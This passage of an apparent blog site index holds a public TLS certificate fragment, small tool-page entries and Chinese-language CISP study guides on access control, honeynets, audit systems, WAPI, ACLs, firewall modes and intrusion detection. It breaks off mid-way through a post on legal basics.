7Mu2d4HocA6HIjHv0mNjZwGckE4QFpSc9Rm2BTBWtoJBYtQxC3nA1OHBNhMfXHAW IdAcUxOMPAyMXRVH+MeUKUGPwuOyKbYbd42oc+rYY5E30iZQYaEEvfp2IgaloD3c B0uPtwYktheSLsmu3BYsLMNslCMtn53UQNqYJj1nhze2TKSj7lIx44cs7TjucKW1 mH3Dh5b7LkVsomwk/2NCtuR81F9rlnMkegyliWiG8XEDeVMOiBxuWqXwgAxmDaSi ILW5CRwANY88iaeKjE5X/R4oGTpj0FYD6fUyDTdAP5qQcTPX17R+QUi0BaqO92U2 h4dmyv9tg0PvSKyNAgMBAAGjggIoMIICJDAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0l BBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYE FFjJsqpo5qVIzNgr6EKyv3++RWZoMB8GA1UdIwQYMBaAFMXPRqTq9MPAemyVxC2w XpIvJuO5MDMGCCsGAQUFBwEBBCcwJTAjBggrBgEFBQcwAoYXaHR0cDovL3IxMS5p LmxlbmNyLm9yZy8wIwYDVR0RBBwwGoIJbmVvMDEuY29tgg13d3cubmVvMDEuY29t MBMGA1UdIAQMMAowCAYGZ4EMAQIBMC4GA1UdHwQnMCUwI6AhoB+GHWh0dHA6Ly9y MTEuYy5sZW5jci5vcmcvNzguY3JsMIIBBAYKKwYBBAHWeQIEAgSB9QSB8gDwAHcA pELFBklgYVSPD9TqnPt6LSZFTYepfy/fRVn2J086hFQAAAGYxGlA4QAABAMASDBG AiEA+tVCCFfQfZzo2+t2cAYAodoV/h7QNOz4WRMlw59O3hwCIQDzd0xLuxcb/N3X +W/Rtasm6Cx+NUkwkEuwKUAxiElYKAB1ABoE/0nQVB1Ar/agw7/x2MRnL07s7iNA aJhrF0Au3Il9AAABmMRpQVwAAAQDAEYwRAIgGni1NW3egKdCHsYWOd2qJWaGtd0l nbxhbr5FWLmj5GACIBK5VTijGZMCVSM6JCAcVpOWhf3grxTi2MRzt879mdtVMA0G CSqGSIb3DQEBCwUAA4IBAQAENCXxsMuo/QrGuzqvrIh1nlFgiNiQZczA1Lged1U5 ZD1TNZM2JuW0xJQ4eWv4AOEYL28RjHLx0TBQtDQRapufl6MBJ6I/JRi+5cklYyA4 r8cyVAqM38QJxOezXsLPCkDdeqWOcdAAXoMrMDicu0ozgB7mCRjtUwvZthP1ZDwj z+teSsdRD4o8s7JDGUiDtWlQvNPAEnCOwwVLfEvVDWU/C77wc3eyy9jLlPwM+3fb ZieuluG8dYhK7yQni4za5FlP0TbZE9sATFEdxL9ttLaUwqRJ6gPMDyilbf4RHQIP 6TOUuLQwBdMT7fbsAnhkZaaZbTZqR9uhefKhFm5Urx3k -----END CERTIFICATE----- function copySampleCert() { const sampleCert = document.getElementById('sampleCert').textContent; copyText(sampleCert); }","lang":"zh-TW"},{"title":"PNG 中繼資料檢查器","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/png-metadata-checker/index.html","permalink":"https://neo01.com/zh-TW/tools/png-metadata-checker/index.html","excerpt":"","text":"Upload or drag and drop a PNG file to extract and analyze its metadata information. 📁 Click here or drag and drop a PNG file","lang":"zh-TW"},{"title":"世界時鐘","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-TW/tools/world-clock/index.html","permalink":"https://neo01.com/zh-TW/tools/world-clock/index.html","excerpt":"","text":"+ Add Timezone Add Timezone 取消 Add","lang":"zh-TW"}],"posts":[{"title":"CISP学习指南：访问控制机制、蜜网、审计系统与WAPI","slug":"2025/10/CISP-Access-Control-Audit-WAPI-zh-CN","date":"un33fin33","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Access-Control-Audit-WAPI/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Access-Control-Audit-WAPI/","excerpt":"深入解析TACACS+集中式访问控制、蜜网功能、审计系统组成和WAPI安全机制。","text":"本文涵盖CISP认证中的访问控制机制、蜜网技术、审计系统和无线安全协议等重要知识点。 一、TACACS+协议与访问控制机制 1.1 访问控制机制类型 访问控制机制根据控制方式可分为集中式和分布式两种类型。 🔐 访问控制机制分类两种主要访问控制机制： 🏢 集中式访问控制（Centralized Access Control） 访问控制决策由中央服务器统一管理 所有访问请求都需要向中央服务器查询 便于统一管理和策略执行 典型协议：TACACS+、RADIUS、Kerberos 🌐 分布式访问控制（Distributed Access Control） 访问控制决策分散在各个节点 每个节点独立做出访问决策 提高系统可扩展性和容错性 典型实现：区块链、分布式账本 graph TB A[\"访问控制机制\"] B[\"集中式访问控制\"] C[\"分布式访问控制\"] A --> B A --> C B --> B1[\"中央服务器\"] B --> B2[\"统一管理\"] B --> B3[\"TACACS+\"] B --> B4[\"RADIUS\"] B --> B5[\"Kerberos\"] C --> C1[\"分散节点\"] C --> C2[\"独立决策\"] C --> C3[\"区块链\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d 1.2 TACACS+协议 💡 TACACS+协议特点TACACS+（Terminal Access Controller Access-Control System Plus） ✅ 提供集中式访问控制 由中央服务器统一管理访问控制策略 所有访问决策由TACACS+服务器做出 网络设备作为客户端向服务器查询 🔐 AAA功能分离 Authentication（认证）：验证用户身份 Authorization（授权）：确定用户权限 Accounting（计费/审计）：记录用户活动 三个功能独立实现，可单独配置 🛡️ 安全特性 全程加密通信 使用TCP协议（端口49） 支持多种认证方式 TACACS+工作流程： sequenceDiagram participant U as 用户 participant D as 网络设备(客户端) participant T as TACACS+服务器 U->>D: 1. 请求访问 D->>T: 2. 认证请求 T->>D: 3. 认证响应 D->>U: 4. 提示输入凭证 U->>D: 5. 提供用户名密码 D->>T: 6. 验证凭证 T->>D: 7. 认证成功 D->>T: 8. 授权请求 T->>D: 9. 返回权限 D->>U: 10. 允许访问 Note over D,T: 集中式访问控制 style T fill:#e3f2fd,stroke:#1976d2 1.3 TACACS+ vs RADIUS 两种集中式访问控制协议对比： 特性 TACACS+ RADIUS 访问控制类型 ✅ 集中式 ✅ 集中式 AAA功能 分离（独立） 合并（认证+授权） 传输协议 TCP（端口49） UDP（端口1812/1813） 加密方式 全程加密 仅密码加密 主要应用 网络设备管理 网络接入控制 厂商支持 Cisco主导 开放标准 💡 TACACS+的优势为什么选择TACACS+： ✅ AAA功能分离 可以单独配置认证、授权、审计 灵活性更高 便于细粒度控制 ✅ 全程加密 整个通信过程加密 安全性更高 防止信息泄露 ✅ 使用TCP 可靠传输 连接状态管理 适合设备管理 1.4 集中式访问控制的优势 集中式访问控制的特点： 集中式访问控制优势： ├── 统一管理 │ ├── 集中配置策略 │ ├── 统一用户管理 │ └── 便于维护更新 ├── 一致性保证 │ ├── 策略统一执行 │ ├── 避免配置不一致 │ └── 减少安全漏洞 ├── 审计便利 │ ├── 集中日志记录 │ ├── 便于审计分析 │ └── 合规性检查 └── 扩展性好 ├── 易于添加新设备 ├── 策略自动下发 └── 减少配置工作 二、蜜网（Honeynet） 2.1 蜜网概述 🍯 蜜网的定义**蜜网（Honeynet）**是一种网络安全技术，通过部署诱饵系统来吸引、监控和分析攻击者的行为。 核心思想： 部署看似真实但实际是陷阱的系统 吸引攻击者进行攻击 在不被察觉的情况下记录攻击行为 分析攻击手法和工具 graph TB A[\"蜜网系统\"] B[\"诱饵系统Honeypot\"] C[\"监控系统Monitoring\"] D[\"分析系统Analysis\"] A --> B A --> C A --> D B --> B1[\"模拟真实系统\"] B --> B2[\"吸引攻击者\"] C --> C1[\"记录攻击行为\"] C --> C2[\"不被察觉\"] D --> D1[\"分析攻击手法\"] D --> D2[\"研究攻击工具\"] style B fill:#fff3e0,stroke:#f57c00 style C fill:#e3f2fd,stroke:#1976d2 style D fill:#e8f5e9,stroke:#388e3d 2.2 蜜网的功能 💡 蜜网的正确功能蜜网的核心功能： ✅ 吸引和转移攻击 可以吸引或转移攻击者的注意力 延缓他们对真正目标的攻击 保护真实系统 ✅ 隐蔽监控 吸引入侵者来嗅探、攻击 同时不被觉察地将入侵者的活动记录下来 获取攻击情报 ✅ 监视、检测和分析 可以对攻击活动进行监视 检测攻击行为 分析攻击手法和工具 ❌ 不是实时报警系统 蜜网不能进行攻击检测和实时报警 这是入侵检测系统（IDS）的功能 蜜网主要用于研究和分析 蜜网 vs IDS功能对比： 功能 蜜网（Honeynet） 入侵检测系统（IDS） 吸引攻击 ✅ 主要功能 ❌ 不具备 转移注意力 ✅ 主要功能 ❌ 不具备 隐蔽记录 ✅ 主要功能 ⚠️ 部分具备 监视分析 ✅ 主要功能 ✅ 主要功能 实时检测 ❌ 不具备 ✅ 主要功能 实时报警 ❌ 不具备 ✅ 主要功能 主动防御 ❌ 不具备 ⚠️ IPS具备 2.3 蜜网的工作原理 蜜网部署架构： graph TB A[\"互联网\"] B[\"防火墙\"] C[\"真实网络\"] D[\"蜜网\"] A --> B B --> C B --> D C --> C1[\"生产服务器\"] C --> C2[\"业务系统\"] D --> D1[\"蜜罐1\"] D --> D2[\"蜜罐2\"] D --> D3[\"监控系统\"] A -.攻击者.-> D D3 --> D4[\"日志分析\"] style C fill:#c8e6c9,stroke:#2e7d32 style D fill:#fff3e0,stroke:#f57c00 style D3 fill:#e3f2fd,stroke:#1976d2 蜜网工作流程： 蜜网工作流程： ├── 1. 部署阶段 │ ├── 设置诱饵系统（蜜罐） │ ├── 配置监控机制 │ └── 隔离真实网络 ├── 2. 吸引阶段 │ ├── 模拟真实系统 │ ├── 暴露漏洞 │ └── 吸引攻击者 ├── 3. 监控阶段 │ ├── 记录所有活动 │ ├── 捕获攻击数据 │ └── 保持隐蔽性 └── 4. 分析阶段 ├── 分析攻击手法 ├── 研究攻击工具 └── 提取威胁情报 2.4 蜜网的应用价值 蜜网的主要用途： 用途 说明 价值 威胁情报收集 了解最新攻击手法 提前防范 攻击工具研究 分析恶意软件 开发防护措施 攻击者画像 了解攻击者行为模式 预测攻击 延缓攻击 转移攻击者注意力 保护真实系统 安全研究 学习攻击技术 提升防御能力 取证分析 收集攻击证据 法律追责 ⚠️ 蜜网的局限性蜜网不能做什么： ❌ 不能实时报警 蜜网主要用于研究和分析 不是实时防护系统 需要配合IDS/IPS使用 ❌ 不能主动防御 只能被动接受攻击 不能阻止攻击 需要其他安全措施配合 ⚠️ 存在风险 可能被攻击者识破 可能成为攻击跳板 需要严格隔离 三、审计系统 3.1 审计系统的基本组成 📊 审计系统的正确组成审计系统一般包含三个部分： 📝 日志记录（Log Recording） 记录系统活动和事件 捕获用户操作 存储审计数据 🔍 日志分析（Log Analysis） 分析日志数据 识别异常行为 发现安全事件 📄 日志报告（Log Reporting） 生成审计报告 展示分析结果 支持决策制定 graph LR A[\"审计系统\"] B[\"1. 日志记录Log Recording\"] C[\"2. 日志分析Log Analysis\"] D[\"3. 日志报告Log Reporting\"] A --> B A --> C A --> D B --> B1[\"记录活动\"] C --> C1[\"分析数据\"] D --> D1[\"生成报告\"] B --> C C --> D style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d 3.2 审计系统组成详解 1. 日志记录（Log Recording） 日志记录功能： ├── 记录内容 │ ├── 用户登录&#x2F;登出 │ ├── 文件访问 │ ├── 系统配置变更 │ ├── 权限变更 │ └── 异常事件 ├── 记录方式 │ ├── 实时记录 │ ├── 自动记录 │ └── 完整记录 └── 存储要求 ├── 安全存储 ├── 防篡改 └── 长期保存 2. 日志分析（Log Analysis） 日志分析功能： ├── 分析方法 │ ├── 模式匹配 │ ├── 统计分析 │ ├── 关联分析 │ └── 异常检测 ├── 分析目标 │ ├── 识别违规行为 │ ├── 发现安全事件 │ ├── 追踪攻击路径 │ └── 评估风险 └── 分析工具 ├── SIEM系统 ├── 日志分析软件 └── 大数据分析 3. 日志报告（Log Reporting） 日志报告功能： ├── 报告类型 │ ├── 定期报告 │ ├── 事件报告 │ ├── 合规报告 │ └── 统计报告 ├── 报告内容 │ ├── 审计结果 │ ├── 安全事件 │ ├── 违规行为 │ └── 改进建议 └── 报告用途 ├── 管理决策 ├── 合规审查 ├── 事件调查 └── 安全改进 3.3 审计系统的作用 💡 安全审计的作用安全审计是对系统活动和记录的独立检查和验证，主要作用包括： ✅ 辅助辨识和分析未经授权的活动或攻击 通过日志分析发现异常行为 识别潜在的安全威胁 追踪攻击路径 ✅ 对与已建立的安全策略的一致性进行核查 检查是否遵守安全策略 验证访问控制有效性 确保合规性 ✅ 帮助发现需要改进的安全控制措施 识别安全弱点 提出改进建议 优化安全策略 ❌ 不能及时阻断违规访问 审计系统是事后检查机制 不能实时阻断访问 这是访问控制系统的功能 审计系统 vs 访问控制系统： 功能 审计系统 访问控制系统 记录活动 ✅ 主要功能 ⚠️ 部分功能 分析行为 ✅ 主要功能 ❌ 不具备 生成报告 ✅ 主要功能 ❌ 不具备 实时阻断 ❌ 不具备 ✅ 主要功能 事后分析 ✅ 主要功能 ❌ 不具备 合规检查 ✅ 主要功能 ⚠️ 部分功能 3.4 审计系统的实施 审计系统实施要点： 审计系统实施： ├── 1. 规划阶段 │ ├── 确定审计目标 │ ├── 识别审计对象 │ ├── 制定审计策略 │ └── 选择审计工具 ├── 2. 部署阶段 │ ├── 配置日志记录 │ ├── 部署分析工具 │ ├── 设置报告机制 │ └── 测试验证 ├── 3. 运行阶段 │ ├── 持续记录日志 │ ├── 定期分析数据 │ ├── 生成审计报告 │ └── 响应发现问题 └── 4. 改进阶段 ├── 评估审计效果 ├── 优化审计策略 ├── 更新审计规则 └── 培训审计人员 四、WAPI无线安全协议 4.1 WAPI概述 📡 WAPI协议WAPI（WLAN Authentication and Privacy Infrastructure） WAPI是中国自主研发的无线局域网安全标准，用于保护无线网络的安全。 安全机制组成： WAI（WLAN Authentication Infrastructure）：身份鉴别 WPI（WLAN Privacy Infrastructure）：数据加密 graph TB A[\"WAPI安全机制\"] B[\"WAI身份鉴别\"] C[\"WPI数据加密\"] A --> B A --> C B --> B1[\"实现对用户身份的鉴别\"] B --> B2[\"双向认证\"] B --> B3[\"证书认证\"] C --> C1[\"实现对传输的数据加密\"] C --> C2[\"保护数据机密性\"] C --> C3[\"保护数据完整性\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d 4.2 WAPI安全机制详解 WAI（WLAN Authentication Infrastructure） 🔐 WAI - 身份鉴别WAI实现对用户身份的鉴别 ✅ 主要功能： 验证用户身份 双向认证（用户和接入点互相认证） 基于证书的认证 🔑 认证过程： 使用公钥基础设施（PKI） 支持数字证书 防止非法接入 WPI（WLAN Privacy Infrastructure） 🔒 WPI - 数据加密WPI实现对传输的数据加密 ✅ 主要功能： 加密无线传输数据 保护数据机密性 保护数据完整性 🛡️ 加密特点： 使用对称加密算法 动态密钥管理 防止窃听和篡改 4.3 WAPI功能对比 WAPI各组件功能对比： 组件 功能 实现方式 保护目标 WAI 身份鉴别 证书认证、双向认证 防止非法接入 WPI 数据加密 对称加密、密钥管理 保护数据安全 ⚠️ 常见误区错误说法：WAI实现对传输的数据加密 ❌ 问题： WAI负责身份鉴别，不是数据加密 数据加密是WPI的功能 混淆了两个组件的职责 ✅ 正确理解： WAI：身份鉴别（Who you are） WPI：数据加密（Protect your data） 两者配合提供完整安全 4.4 WAPI vs WPA/WPA2 无线安全协议对比： 特性 WAPI WPA/WPA2 标准来源 中国国家标准 国际标准 认证方式 证书认证（WAI） PSK或802.1X 加密方式 WPI TKIP/AES 安全性 高 高 应用范围 主要在中国 全球通用 强制性 中国强制 国际推荐 五、总结 访问控制机制、蜜网、审计系统与WAPI的核心要点： 🎯 关键要点TACACS+协议： TACACS+提供集中式访问控制机制 不是分布式访问控制 AAA功能分离，全程加密 蜜网功能： 可以吸引或转移攻击者的注意力 可以隐蔽记录入侵者的活动 可以对攻击活动进行监视、检测和分析 不能进行攻击检测和实时报警 审计系统组成： 日志记录：记录系统活动 日志分析：分析日志数据 日志报告：生成审计报告 三个部分缺一不可 审计系统作用： 辅助辨识和分析未经授权的活动或攻击 对安全策略的一致性进行核查 帮助发现需要改进的安全控制措施 不能及时阻断违反安全策略的访问 WAPI安全机制： WAI实现对用户身份的鉴别 WPI实现对传输的数据加密 两者配合提供完整的无线安全 💡 实践建议 使用集中式访问控制简化管理 部署蜜网收集威胁情报 建立完善的审计系统 定期分析审计日志 在无线网络中使用WAPI或WPA2 区分各组件的功能和职责 配合多种安全机制形成纵深防御 六、路由器访问控制列表（ACL） 6.1 标准访问控制列表 🔐 标准ACL的判别条件路由器的标准访问控制列表以数据包的源地址作为判别条件 ✅ 标准ACL特点： 只检查数据包的源IP地址 编号范围：1-99, 1300-1999 判断简单，性能较高 功能相对有限 ❌ 标准ACL不检查： 数据包的大小 数据包的端口号 数据包的目的地址 协议类型 标准ACL vs 扩展ACL： 特性 标准ACL 扩展ACL 判别条件 仅源IP地址 源/目的IP、端口、协议 编号范围 1-99, 1300-1999 100-199, 2000-2699 功能 简单过滤 精细控制 性能 较高 相对较低 应用场景 简单访问控制 复杂安全策略 七、防火墙部署模式 7.1 桥接/透明模式 🛡️ 桥接模式的特点桥接或透明模式的优点： ✅ 不需要修改网络配置 防火墙对网络透明 不需要修改IP地址 部署简单快速 ✅ 性能比较高 工作在数据链路层 处理速度快 延迟较低 ✅ 防火墙本身不容易受到攻击 没有IP地址 攻击者难以定位 隐蔽性好 ❌ 不易实现NAT NAT需要工作在网络层 桥接模式工作在数据链路层 无法进行地址转换 防火墙部署模式对比： 特性 路由模式 桥接/透明模式 工作层次 网络层（Layer 3） 数据链路层（Layer 2） IP地址 需要配置 不需要 网络修改 需要修改 不需要修改 NAT支持 ✅ 支持 ❌ 不支持 性能 相对较低 较高 隐蔽性 较低 高 部署难度 较高 较低 八、入侵检测系统（IDS） 8.1 IDS检测方法 🔍 IDS的两种检测方法入侵检测系统的检测方法： 📋 基于特征（Signature-based） 也称为基于知识的检测 匹配已知攻击特征 误报率低 无法检测新攻击 📊 基于行为（Behavior-based） 也称为基于异常的检测 检测偏离正常行为的活动 可以检测新攻击 误报率高 8.2 两种检测方法对比 💡 IDS检测方法的正确理解关键区别： ✅ 基于特征的系统 只能检测已知攻击类型 不能检测新的攻击类型 误报率低（因为匹配已知特征） 需要定期更新特征库 ✅ 基于行为的系统 可以检测新的攻击类型 误报率高（正常行为可能被误判） 需要建立正常行为基线 维护行为模型数据库 IDS检测方法详细对比： 特性 基于特征（Signature-based） 基于行为（Behavior-based） 检测原理 匹配已知攻击特征 检测异常行为 检测新攻击 ❌ 不能 ✅ 能 误报率 ⭐⭐ 低 ⭐⭐⭐⭐⭐ 高 漏报率 ⭐⭐⭐⭐ 高（对新攻击） ⭐⭐ 低 维护工作 更新特征库 维护行为基线 数据库类型 特征数据库 行为/状态数据库 性能开销 较低 较高 适用场景 已知威胁防护 未知威胁检测 九、网络入侵检测系统（NIDS） 9.1 NIDS常见技术 🔍 NIDS技术网络入侵检测系统（NIDS）的常见技术： ✅ 协议分析（Protocol Analysis） 分析网络协议 检测协议异常 NIDS的核心技术 ✅ 零拷贝（Zero Copy） 减少数据复制 提高处理性能 优化技术 ✅ IP碎片重组（IP Fragment Reassembly） 重组分片数据包 检测分片攻击 必要的技术 ❌ SYN Cookie 防御SYN Flood攻击 属于防火墙/IPS技术 不属于NIDS技术 NIDS技术分类： 技术 类型 用途 是否属于NIDS 协议分析 检测技术 分析协议异常 ✅ 是 零拷贝 性能优化 提高处理速度 ✅ 是 IP碎片重组 检测技术 检测分片攻击 ✅ 是 SYN Cookie 防御技术 防御SYN Flood ❌ 否 为什么SYN Cookie不属于NIDS技术： ⚠️ 关键区分NIDS vs IPS/防火墙： NIDS（入侵检测系统）： 被动监控和检测 发现攻击并报警 不主动阻断攻击 技术：协议分析、特征匹配、异常检测 IPS/防火墙（入侵防御系统）： 主动防御和阻断 阻止攻击发生 实时防护 技术：SYN Cookie、连接限制、主动阻断 SYN Cookie： 是一种主动防御技术 用于防御SYN Flood攻击 属于IPS/防火墙技术 不属于NIDS的被动检测技术 十、总结 访问控制机制、蜜网、审计系统、WAPI、ACL、防火墙和IDS的核心要点： 🎯 关键要点TACACS+协议： TACACS+提供集中式访问控制机制 不是分布式访问控制 AAA功能分离，全程加密 蜜网功能： 可以吸引或转移攻击者的注意力 可以隐蔽记录入侵者的活动 可以对攻击活动进行监视、检测和分析 不能进行攻击检测和实时报警 审计系统组成： 日志记录：记录系统活动 日志分析：分析日志数据 日志报告：生成审计报告 三个部分缺一不可 审计系统作用： 辅助辨识和分析未经授权的活动或攻击 对安全策略的一致性进行核查 帮助发现需要改进的安全控制措施 不能及时阻断违反安全策略的访问 WAPI安全机制： WAI实现对用户身份的鉴别 WPI实现对传输的数据加密 两者配合提供完整的无线安全 路由器ACL： 标准ACL以源地址作为判别条件 扩展ACL可以检查源/目的地址、端口、协议 标准ACL功能简单但性能高 防火墙部署模式： 桥接/透明模式不需要修改网络配置 桥接模式性能高，隐蔽性好 桥接模式不易实现NAT IDS检测方法： 基于特征：误报率低，不能检测新攻击 基于行为：误报率高，能检测新攻击 基于行为系统维护行为/状态数据库 NIDS技术： 协议分析、零拷贝、IP碎片重组属于NIDS技术 SYN Cookie不属于NIDS技术 SYN Cookie是IPS/防火墙的主动防御技术 💡 实践建议 使用集中式访问控制简化管理 部署蜜网收集威胁情报 建立完善的审计系统 定期分析审计日志 在无线网络中使用WAPI或WPA2 根据需求选择标准或扩展ACL 根据网络环境选择防火墙部署模式 结合基于特征和基于行为的IDS 配合多种安全机制形成纵深防御","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：入侵检测系统与法律基础","slug":"2025/10/CISP-IDS-Law-zh-CN","date":"un22fin22","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-IDS-Law/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-IDS-Law/","excerpt":"深入解析CISP认证中的入侵检测系统局限性和信息安全法律基础知识点。","text":"入侵检测系统是网络安全的重要组成部分，而法律法规则为信息安全提供制度保障。 一、入侵检测系统（IDS） 1.1 IDS概述 入侵检测系统的定义： 🔍 入侵检测系统（IDS）Intrusion Detection System 一种监控网络或系统活动，检测恶意行为或策略违规的安全技术。 核心功能： 👁️ 监控 实时监控网络流量 监控系统活动 收集安全事件 🔍 检测 识别攻击行为 发现异常活动 检测策略违规 📢 告警 生成安全告警 通知管理员 记录事件日志 IDS的分类： graph TB A[\"入侵检测系统\"] B[\"按部署位置\"] C[\"按检测方法\"] A --> B A --> C B --> B1[\"NIDS网络入侵检测\"] B --> B2[\"HIDS主机入侵检测\"] C --> C1[\"基于签名Signature-based\"] C --> C2[\"基于异常Anomaly-based\"] C --> C3[\"混合检测Hybrid\"] B1 --> B1A[\"监控网络流量\"] B2 --> B2A[\"监控主机活动\"] C1 --> C1A[\"匹配已知攻击\"] C2 --> C2A[\"检测异常行为\"] C3 --> C3A[\"结合两种方法\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 1.2 IDS的优势 IDS的技术优越性： 优势 说明 价值 实时监控 7×24小时持续监控 及时发现威胁 全面覆盖 监控多个层面 提高检测率 证据收集 记录攻击详情 支持事件分析 合规支持 满足审计要求 符合法规要求 威胁情报 积累攻击数据 改进防御策略 1.3 IDS的局限性 💡 入侵检测系统的局限性入侵检测系统有其技术优越性，但也存在一些局限性。 常见的误解： ❌ 配置简单论 错误说法：对用户知识要求高，但配置、操作和管理使用过于简单 这是自相矛盾的说法 正确理解：IDS对用户知识要求高，配置、操作和管理使用复杂 IDS配置复杂，需要专业知识 配置不当容易产生误报或漏报 管理和维护需要专业技能 真实的局限性： ✅ 高误报率 入侵检测系统会产生大量的警告信息和可疑的入侵行为记录 这是IDS的典型局限性 误报率高导致告警疲劳，用户处理负担很重 需要人工分析和判断，增加运维负担 ✅ 自身安全问题 入侵检测系统在应对自身攻击时，对其他数据的检测可能会被控制或者受到影响 IDS本身可能成为攻击目标 攻击者可能试图绕过或禁用IDS IDS被攻击时检测能力下降，需要保护IDS自身安全 ✅ 日志完整性问题 警告消息记录如果不完整，可能无法与入侵行为关联 日志不完整影响分析，难以还原攻击过程 影响事件响应，需要完整的日志记录 IDS局限性详解： graph TB A[\"IDS的局限性\"] B[\"配置复杂\"] C[\"高误报率\"] D[\"自身安全\"] E[\"日志完整性\"] F[\"性能影响\"] A --> B A --> C A --> D A --> E A --> F B --> B1[\"需要专业知识\"] B --> B2[\"配置工作量大\"] B --> B3[\"维护成本高\"] C --> C1[\"告警疲劳\"] C --> C2[\"处理负担重\"] C --> C3[\"影响效率\"] D --> D1[\"可能被攻击\"] D --> D2[\"检测能力下降\"] D --> D3[\"需要额外保护\"] E --> E1[\"日志可能不完整\"] E --> E2[\"难以关联分析\"] E --> E3[\"影响取证\"] F --> F1[\"消耗系统资源\"] F --> F2[\"可能影响性能\"] F --> F3[\"网络延迟\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffebee,stroke:#d32f2f style E fill:#fff9c4,stroke:#f57f17 style F fill:#f3e5f5,stroke:#7b1fa2 1.4 IDS的主要局限性 详细分析各项局限性： IDS的局限性： ├── 1. 配置和管理复杂 │ ├── 问题： │ │ ├── 对用户知识要求高 │ │ ├── 配置参数众多 │ │ ├── 规则编写复杂 │ │ └── 需要持续调优 │ ├── 影响： │ │ ├── 部署周期长 │ │ ├── 人力成本高 │ │ ├── 配置错误风险 │ │ └── 维护难度大 │ └── 对策： │ ├── 加强培训 │ ├── 使用模板 │ ├── 自动化工具 │ └── 专业服务 ├── 2. 高误报率 │ ├── 问题： │ │ ├── 产生大量告警 │ │ ├── 真实攻击淹没 │ │ ├── 告警疲劳 │ │ └── 处理负担重 │ ├── 影响： │ │ ├── 降低响应效率 │ │ ├── 浪费人力资源 │ │ ├── 可能忽略真实威胁 │ │ └── 影响系统可信度 │ └── 对策： │ ├── 规则优化 │ ├── 白名单机制 │ ├── 关联分析 │ └── 机器学习 ├── 3. 自身安全问题 │ ├── 问题： │ │ ├── IDS可能被攻击 │ │ ├── 检测能力被削弱 │ │ ├── 日志可能被篡改 │ │ └── 配置可能被修改 │ ├── 影响： │ │ ├── 检测失效 │ │ ├── 产生盲区 │ │ ├── 证据丢失 │ │ └── 安全风险增加 │ └── 对策： │ ├── 加固IDS系统 │ ├── 隔离部署 │ ├── 访问控制 │ └── 日志保护 ├── 4. 日志完整性问题 │ ├── 问题： │ │ ├── 日志可能不完整 │ │ ├── 存储空间限制 │ │ ├── 日志轮转丢失 │ │ └── 网络中断影响 │ ├── 影响： │ │ ├── 无法完整还原攻击 │ │ ├── 难以关联分析 │ │ ├── 影响取证 │ │ └── 降低分析价值 │ └── 对策： │ ├── 充足存储空间 │ ├── 集中日志管理 │ ├── 日志备份 │ └── 完整性校验 └── 5. 性能影响 ├── 问题： │ ├── 消耗系统资源 │ ├── 可能影响网络性能 │ ├── 高流量时延迟 │ └── 处理能力限制 ├── 影响： │ ├── 业务性能下降 │ ├── 用户体验变差 │ ├── 可能丢包 │ └── 检测不及时 └── 对策： ├── 硬件加速 ├── 分布式部署 ├── 流量采样 └── 性能优化 1.5 IDS与IPS的对比 IDS vs IPS： 特性 IDS（检测） IPS（防御） 部署方式 旁路部署 串联部署 主要功能 检测和告警 检测和阻断 对流量影响 不影响 可能影响 误报影响 产生告警 可能阻断正常流量 响应方式 被动响应 主动防御 性能要求 相对较低 要求较高 适用场景 监控分析 实时防护 IDS和IPS的结合使用： graph LR A[\"互联网\"] --> B[\"IPS串联部署\"] B --> C[\"防火墙\"] C --> D[\"IDS旁路部署\"] D -.监控.-> E[\"内部网络\"] C --> E B --> B1[\"主动阻断\"] D --> D1[\"监控告警\"] style B fill:#ffcdd2,stroke:#c62828 style D fill:#e3f2fd,stroke:#1976d2 style E fill:#e8f5e9,stroke:#388e3d 1.6 IDS的最佳实践 有效使用IDS的建议： 🎯 IDS最佳实践部署阶段： 合理规划部署位置 选择合适的检测引擎 配置基线规则 进行充分测试 运营阶段： 持续优化规则 降低误报率 定期审查告警 关联分析事件 维护阶段： 定期更新规则库 监控系统性能 备份配置和日志 定期安全评估 人员培养： 加强专业培训 建立知识库 分享经验教训 提升分析能力 二、信息安全法律基础 2.1 法律的概念 法律的定义： ⚖️ 什么是法律法律是由国家制定或认可，并由国家强制力保证实施的，反映统治阶级意志的行为规范体系。 法律的特征： 🏛️ 国家意志 由国家制定或认可 代表国家意志 具有权威性 ⚡ 强制性 由国家强制力保证实施 违反有明确后果 具有约束力 📋 规范性 规定行为准则 明确权利义务 具有普遍适用性 2.2 法律的特点 💡 法律的特点关于法律的特点，需要正确理解其基本属性。 法律的正确特点： ✅ 国家意志的统一体现 法律代表国家意志 具有严密的逻辑体系 不同法律之间有效力层级 形成完整的法律体系 ✅ 相对稳定性 一旦制定，就比较稳定，长期有效 不允许经常更改，不能朝令夕改 保证法律的权威性 但可以根据需要修订 ✅ 硬约束特征 法律对违法犯罪的后果有明确规定 是一种&quot;硬约束&quot; 法律规定明确的法律责任，违法必究 具有强制执行力，是最严格的行为规范 常见误解： ❌ 法律可以是&quot;内部&quot;的 这是错误的说法 法律必须公开，这是基本原则 不公开的规范不能称为法律 &quot;内部&quot;规定不具有法律效力 法律的公开性保证公民知法守法 法律的基本特点： graph TB A[\"法律的特点\"] B[\"国家意志\"] C[\"必须公开\"] D[\"相对稳定\"] E[\"硬约束\"] A --> B A --> C A --> D A --> E B --> B1[\"统一体现\"] B --> B2[\"严密体系\"] B --> 